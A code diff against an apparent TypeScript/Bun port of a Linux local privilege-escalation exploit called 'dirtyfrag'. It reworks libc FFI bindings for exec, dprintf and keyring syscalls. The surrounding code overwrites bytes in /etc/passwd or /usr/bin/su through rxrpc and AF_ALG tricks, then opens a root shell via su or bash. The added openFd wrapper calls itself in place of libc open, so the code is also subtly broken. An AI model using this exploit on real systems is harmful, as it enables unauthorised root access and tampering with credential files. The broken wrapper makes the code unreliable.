@@ -176,53 +176,57 @@ export const { symbols: C } = dlopen("libc.so.6", {
   },
   __errno_location: { returns: FFIType.ptr, args: [] },
 
-  // ---- exec variants (fixed arities) ----
-  // execlp(file, arg0, arg1, NULL)
-  execlp_2: {
-    name: "execlp",
+  // ---- exec (max-arity single declarations, pass null for unused trailing args) ----
+  // execlp(file, arg0, arg1, arg2, arg3, NULL) — covers 0..4 real args
+  execlp: {
     returns: FFIType.i32,
-    args: [FFIType.cstring, FFIType.cstring, FFIType.ptr],
-  },
-  // execlp(file, arg0, arg1, arg2, NULL)
-  execlp_3: {
-    name: "execlp",
-    returns: FFIType.i32,
-    args: [FFIType.cstring, FFIType.cstring, FFIType.cstring, FFIType.ptr],
-  },
-  // execl(path, arg0, arg1, NULL)
-  execl_2: {
-    name: "execl",
-    returns: FFIType.i32,
-    args: [FFIType.cstring, FFIType.cstring, FFIType.cstring, FFIType.ptr],
-  },
-  // execlp("/bin/bash", "bash", NULL)
-  execlp_bash: {
-    name: "execlp",
-    returns: FFIType.i32,
-    args: [FFIType.cstring, FFIType.cstring, FFIType.ptr],
-  },
-
-  // ---- raw syscalls ----
-  // syscall(SYS_add_key, type, desc, payload, plen, ringid)
-  sys_add_key: {
-    name: "syscall",
-    returns: FFIType.i64,
     args: [
-      FFIType.i64,
+      FFIType.cstring, FFIType.cstring,
+      FFIType.cstring, FFIType.cstring,
       FFIType.ptr,
-      FFIType.ptr,
-      FFIType.ptr,
-      FFIType.u64,
-      FFIType.i32,
     ],
   },
-  // syscall(SYS_keyctl, KEYCTL_INVALIDATE, key)
-  sys_keyctl_inval: {
-    name: "syscall",
+  // execl(path, arg0, arg1, arg2, NULL) — covers 0..3 real args
+  execl: {
+    returns: FFIType.i32,
+    args: [
+      FFIType.cstring, FFIType.cstring,
+      FFIType.cstring, FFIType.ptr,
+    ],
+  },
+
+  // ---- dprintf(fd, fmt, int_arg) ----
+  dprintf: {
+    returns: FFIType.i32,
+    args: [FFIType.i32, FFIType.cstring, FFIType.i32],
+  },
+});
+
+// Two separate dlopens for syscall — same symbol, different arg layouts.
+// Bun FFI requires the key name to match the actual exported symbol, so we
+// destructure each `syscall` into an alias at import time.
+const { symbols: { syscall: _sysAddKeyRaw } } = dlopen("libc.so.6", {
+  syscall: {
+    returns: FFIType.i64,
+    args: [FFIType.i64, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.u64, FFIType.i32],
+  },
+});
+export function sysAddKey(
+  nr: bigint, type: Buffer, desc: Buffer, payload: Buffer,
+  plen: bigint, ringid: number,
+): bigint {
+  return _sysAddKeyRaw(nr, ptr(type), ptr(desc), ptr(payload), plen, ringid) as bigint;
+}
+
+const { symbols: { syscall: _sysKeyctlRaw } } = dlopen("libc.so.6", {
+  syscall: {
     returns: FFIType.i64,
     args: [FFIType.i64, FFIType.i32, FFIType.i64],
   },
 });
+export function sysKeyctlInval(nr: bigint, op: number, key: bigint): bigint {
+  return _sysKeyctlRaw(nr, op, key) as bigint;
+}
 
 // ── errno / strerror ──────────────────────────────────────────────────────────
 
@@ -440,8 +444,20 @@ export function WEXITSTATUS(s: number): number {
 
 // ── getenv helper ─────────────────────────────────────────────────────────────
 
+// ── cstring encoding (Bun v1.3 requires Buffer, not raw string, for cstring args) ──
+
+/** Encode a JS string as a null-terminated latin-1 Buffer for FFI cstring args. */
+export function cstr(s: string): Buffer {
+  return Buffer.from(s + "\0", "latin1");
+}
+
+/** open() wrapper that handles string → Buffer encoding. */
+export function openFd(path: string, flags: number, mode = 0): number {
+  return openFd(cstr(path), flags, mode) as number;
+}
+
 export function getEnv(name: string): string | null {
-  const p = C.getenv(name) as number | null;
+  const p = C.getenv(cstr(name)) as number | null;
   if (!p) return null;
   return readCStr(p);
 }
@@ -536,7 +552,7 @@ function putAttr(nlhBuf: Buffer, attrType: number, data: Buffer): void {
 // ── write_proc / write_file ───────────────────────────────────────────────────
 
 function writeProc(path: string, content: string): number {
-  const fd = C.open(path, O_WRONLY, 0) as number;
+  const fd = openFd(path, O_WRONLY, 0) as number;
   if (fd < 0) return -1;
   const buf = Buffer.from(content, "ascii");
   const n = C.write(fd, ptr(buf), BigInt(buf.length)) as bigint;
@@ -753,7 +769,7 @@ function doOneWrite(path: string, offset: number, spi: number): number {
   }
 
   // open target file
-  const fileFd = C.open(path, O_RDONLY, 0) as number;
+  const fileFd = openFd(path, O_RDONLY, 0) as number;
   if (fileFd < 0) {
     C.close(skSend);
     C.close(skRecv);
@@ -825,7 +841,7 @@ function doOneWrite(path: string, offset: number, spi: number): number {
 // ── verify_byte ───────────────────────────────────────────────────────────────
 
 function verifyByte(path: string, offset: number, want: number): number {
-  const fd = C.open(path, O_RDONLY, 0) as number;
+  const fd = openFd(path, O_RDONLY, 0) as number;
   if (fd < 0) return -1;
   const got = Buffer.alloc(1);
   const n = C.pread64(fd, ptr(got), 1n, BigInt(offset)) as bigint;
@@ -924,7 +940,7 @@ export const SESSION_KEY = Buffer.from([
 // ── do_unshare_userns_netns (rxrpc path — identity uid/gid map) ───────────────
 
 function writeFile(path: string, content: string): number {
-  const fd = C.open(path, O_WRONLY, 0) as number;
+  const fd = openFd(path, O_WRONLY, 0) as number;
   if (fd < 0) return -1;
   const b = Buffer.from(content, "ascii");
   const r = C.write(fd, ptr(b), BigInt(b.length)) as bigint;
@@ -1043,14 +1059,7 @@ function keyAdd(
 ): bigint {
   const typeBuf = Buffer.from(type + "\0", "ascii");
   const descBuf = Buffer.from(desc + "\0", "ascii");
-  return C.sys_add_key(
-    SYS_ADD_KEY,
-    ptr(typeBuf),
-    ptr(descBuf),
-    ptr(payload),
-    BigInt(payload.length),
-    ringid,
-  ) as bigint;
+  return sysAddKey(SYS_ADD_KEY, typeBuf, descBuf, payload, BigInt(payload.length), ringid);
 }
 
 export function addRxrpcKey(desc: string): bigint {
@@ -1059,7 +1068,7 @@ export function addRxrpcKey(desc: string): bigint {
 }
 
 export function keyctlInvalidate(key: bigint): void {
-  C.sys_keyctl_inval(SYS_KEYCTL, KEYCTL_INVALIDATE, key);
+  sysKeyctlInval(SYS_KEYCTL, KEYCTL_INVALIDATE, key);
 }
 
 // ── Struct sizes for AF_ALG / msghdr ─────────────────────────────────────────
@@ -1955,33 +1964,7 @@ function fcSplitmix64(s: bigint): [bigint /*result*/, bigint /*new_s*/] {
 // PART 6 — rxrpc_lpe_main · run_root_pty · main
 // ═══════════════════════════════════════════════════════════════════════════════
 
-// Extra FFI symbols not in Part 1 (opened lazily from the same libc)
-const { symbols: C2 } = dlopen("libc.so.6", {
-  // signal with handler as raw integer (SIG_IGN=1, SIG_DFL=0)
-  signal_ign: {
-    name: "signal",
-    returns: FFIType.ptr,
-    args: [FFIType.i32, FFIType.u64],
-  },
-  // execlp(file, arg0, arg1, arg2, NULL)
-  execlp_4: {
-    name: "execlp",
-    returns: FFIType.i32,
-    args: [
-      FFIType.cstring,
-      FFIType.cstring,
-      FFIType.cstring,
-      FFIType.cstring,
-      FFIType.ptr,
-    ],
-  },
-  // dprintf(fd, fmt, ...)  — only used as dprintf(2, "...", n)
-  dprintf_si: {
-    name: "dprintf",
-    returns: FFIType.i32,
-    args: [FFIType.i32, FFIType.cstring, FFIType.i32],
-  },
-});
+// (C2 removed — exec/signal/dprintf now use the main dlopen symbols)
 
 // ── Already-patched checks ────────────────────────────────────────────────────
 
@@ -1990,7 +1973,7 @@ const SU_MARKER = new Uint8Array([
 ]);
 
 function suAlreadyPatched(): boolean {
-  const fd = C.open("/usr/bin/su", O_RDONLY, 0) as number;
+  const fd = openFd("/usr/bin/su", O_RDONLY, 0) as number;
   if (fd < 0) return false;
   const got = Buffer.alloc(8);
   const n = C.pread64(fd, ptr(got), 8n, 0x78n) as bigint;
@@ -1999,7 +1982,7 @@ function suAlreadyPatched(): boolean {
 }
 
 function passwdAlreadyPatched(): boolean {
-  const fd = C.open("/etc/passwd", O_RDONLY, 0) as number;
+  const fd = openFd("/etc/passwd", O_RDONLY, 0) as number;
   if (fd < 0) return false;
   const head = Buffer.alloc(16);
   const n = C.pread64(fd, ptr(head), 16n, 0n) as bigint;
@@ -2015,7 +1998,7 @@ function eitherTargetPatched(): boolean {
 
 function silenceStderr(): number {
   const saved = C.dup(STDERR_FILENO) as number;
-  const dn = C.open("/dev/null", O_WRONLY, 0) as number;
+  const dn = openFd("/dev/null", O_WRONLY, 0) as number;
   if (dn >= 0) {
     C.dup2(dn, STDERR_FILENO);
     C.close(dn);
@@ -2034,9 +2017,9 @@ function restoreStderr(saved: number): void {
 
 function execSuLogin(): void {
   for (const p of ["/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su"]) {
-    C.execl_2(p, "su", "-", null);
+    C.execl(cstr(p), cstr("su"), cstr("-"), null);
   }
-  C.execlp_3("su", "su", "-", null);
+  C.execlp(cstr("su"), cstr("su"), cstr("-"), null, null);
 }
 
 // ── run_root_pty ──────────────────────────────────────────────────────────────
@@ -2071,7 +2054,7 @@ function runRootPty(): number {
   if (pid === 0) {
     // child: open slave, become session leader, exec su
     C.setsid();
-    const slave = C.open(slaveName, O_RDWR, 0) as number;
+    const slave = openFd(slaveName, O_RDWR, 0) as number;
     if (slave < 0) C._exit(127);
     C.ioctl(slave, TIOCSCTTY, Buffer.alloc(4));
     C.dup2(slave, 0);
@@ -2083,11 +2066,11 @@ function runRootPty(): number {
     C._exit(127);
   }
 
-  // parent: raw mode + bridge
-  C2.signal_ign(SIGTTOU, 1n);
-  C2.signal_ign(SIGTTIN, 1n);
-  C2.signal_ign(SIGPIPE, 1n);
-  C2.signal_ign(SIGHUP, 1n);
+  // parent: raw mode + bridge — SIG_IGN = (void*)1
+  C.signal(SIGTTOU, 1);
+  C.signal(SIGTTIN, 1);
+  C.signal(SIGPIPE, 1);
+  C.signal(SIGHUP,  1);
   C.setpgid(0, 0);
   C.tcsetpgrp(STDIN_FILENO, C.getpid() as number);
 
@@ -2198,7 +2181,7 @@ export function rxrpcLpeMain(argv: string[]): number {
 
   // open target file
   const targetPath = getEnv("POC_TARGET_FILE") || "/etc/passwd";
-  const rfdRo = C.open(targetPath, O_RDONLY, 0) as number;
+  const rfdRo = openFd(targetPath, O_RDONLY, 0) as number;
   if (rfdRo < 0) {
     WARN(`open ${targetPath} RO: ${errStr()}`);
     return 1;
@@ -2433,7 +2416,7 @@ export function rxrpcLpeMain(argv: string[]): number {
         C.dup2(pw, 1);
         C.dup2(pw, 2);
         C.close(pw);
-        C2.execlp_4("getent", "getent", "passwd", "root", null);
+        C.execlp(cstr("getent"), cstr("getent"), cstr("passwd"), cstr("root"), null);
         C._exit(127);
       }
       C.close(pw);
@@ -2493,7 +2476,7 @@ function rxrpcLpePty(): number {
   }
   if (pid === 0) {
     C.setsid();
-    const slave = C.open(slaveName, O_RDWR, 0) as number;
+    const slave = openFd(slaveName, O_RDWR, 0) as number;
     if (slave < 0) C._exit(127);
     C.ioctl(slave, TIOCSCTTY, Buffer.alloc(4));
     C.dup2(slave, 0);
@@ -2501,7 +2484,7 @@ function rxrpcLpePty(): number {
     C.dup2(slave, 2);
     if (slave > 2) C.close(slave);
     C.close(master);
-    C.execlp_2("su", "su", null);
+    C.execlp(cstr("su"), cstr("su"), null, null, null);
     C._exit(127);
   }
 
@@ -2595,7 +2578,7 @@ export function main(argv: string[]): number {
 
   // already root — just drop into bash
   if ((C.getuid() as number) === 0) {
-    C.execlp_bash("/bin/bash", "bash", null);
+    C.execlp(cstr("/bin/bash"), cstr("bash"), null, null, null);
     C._exit(1);
   }
 
@@ -2626,7 +2609,7 @@ export function main(argv: string[]): number {
     return 0;
   }
 
-  C2.dprintf_si(2, "dirtyfrag: failed (rc=%d)\n", rc);
+  C.dprintf(2, cstr("dirtyfrag: failed (rc=%d)\n"), rc);
   return rc !== 0 ? rc : 1;
 }
 
